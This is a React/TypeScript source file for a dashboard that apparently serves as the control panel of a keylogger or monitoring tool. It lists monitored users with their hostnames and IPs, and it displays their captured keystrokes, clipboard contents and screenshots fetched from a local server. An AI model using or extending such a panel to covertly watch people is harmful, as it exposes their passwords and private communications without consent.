"use client";

import React, { useEffect, useState } from "react";
import Sidebar from "@/components/Sidebar";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import ScreenshotGallery from "@/components/ScreenshotGallery";
import KeystrokeLogs from "@/components/KeystrokeLogs";
import SectionButtons from "@/components/SectionButtons"; // Import the new SectionButtons component

const Dashboard: React.FC = () => {
  const [users, setUsers] = useState<string[]>([]);
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [activeUsers, setActiveUsers] = useState<string[]>([]);
  const [keyLogs, setKeyLogs] = useState<
    {
      timestamp: string;
      text: string;
      username: string;
      hostname: string;
      ip: string;
    }[]
  >([]);
  const [clipboard, setClipboard] = useState<
    {
      timestamp: string;
      text: string;
      username: string;
      hostname: string;
      ip: string;
    }[]
  >([]);
  const [activeSection, setActiveSection] = useState<
    "keystrokes" | "screenshots" | "applications" | "liveview" 
  >(); // Initialize as empty string

  useEffect(() => {
    // Check local storage for selected user
    const storedUser = localStorage.getItem("selectedUser");
    if (storedUser) {
      setSelectedUser(storedUser);
    }

    const fetchUsers = async () => {
      try {
        const response = await fetch("http://192.168.1.200:8080/get_users");
        if (response.ok) {
          const data = await response.json();
          setUsers(data.users);
        } else {
          console.error("Failed to fetch users");
        }
      } catch (error) {
        console.error("Error fetching users:", error);
      }
    };

    const fetchActiveUsers = async () => {
      try {
        const response = await fetch(
          "http://192.168.1.200:8080/get_active_users"
        );
        if (response.ok) {
          const data = await response.json();
          setActiveUsers(data.active_users);
        } else {
          console.error("Failed to fetch active users");
        }
      } catch (error) {
        console.error("Error fetching active users:", error);
      }
    };

    fetchUsers();
    fetchActiveUsers();
    const interval = setInterval(fetchActiveUsers, 10000); // Refresh every 10 seconds

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (selectedUser && activeSection) {
      const fetchLogs = async () => {
        try {
          const response = await fetch(
            `http://192.168.1.200:8080/get_logs?username=${selectedUser}&type=${activeSection}`
          );
          if (response.ok) {
            const data = await response.json();
            if (activeSection === "keystrokes") {
              setKeyLogs(data.logs);
            }
            // You can handle other sections here if needed
          } else {
            console.error("Failed to fetch logs");
          }
        } catch (error) {
          console.error("Error fetching logs:", error);
        }
      };

      fetchLogs();
    }
  }, [selectedUser, activeSection]);

  const handleButtonClick = (
    section: "keystrokes" | "screenshots" | "applications" | "liveview"
  ) => {
    setActiveSection(section);
  };

  const handleSelectUser = (username: string) => {
    setSelectedUser(username);
    localStorage.setItem("selectedUser", username); // Store the selected user in local storage
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <Header />
      <main className="flex-grow">
        <div className="container mx-auto p-4">
          <div className="grid grid-cols-12 gap-4">
            {/* Sidebar */}
            <Sidebar
              users={users}
              selectedUser={selectedUser}
              activeUsers={activeUsers}
              onSelectUser={handleSelectUser}
            />

            {/* Main Content Area */}
            <div className="col-span-9 px-4">
              {/* Section Buttons */}
              <SectionButtons
                activeSection={activeSection}
                handleButtonClick={handleButtonClick}
              />

              {/* Content Sections */}
              <div className="border-t border-gray-300 pt-4">
                {selectedUser && (
                  <div className="p-4 bg-slate-50 rounded-lg shadow-md mb-4">
                    <h2 className="text-lg font-bold text-blue-600">
                      {selectedUser}
                    </h2>
                    <p className="text-md">
                      Hostname: {keyLogs[0]?.hostname || "N/A"}
                    </p>
                    <p className="text-md">
                      IP Address: {keyLogs[0]?.ip || "N/A"}
                    </p>
                  </div>
                )}

                {activeSection === "keystrokes" && selectedUser && (
                  <KeystrokeLogs keyLogs={keyLogs} />
                )}

                {activeSection === "screenshots" && selectedUser && (
                  <div>
                    {/* Screenshot Gallery Section */}
                    <div className="mt-8">
                      <h2 className="text-xl font-semibold">Screenshots</h2>
                      <ScreenshotGallery username={selectedUser} />
                    </div>
                  </div>
                )}

                {/* Add other sections here */}
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Dashboard;
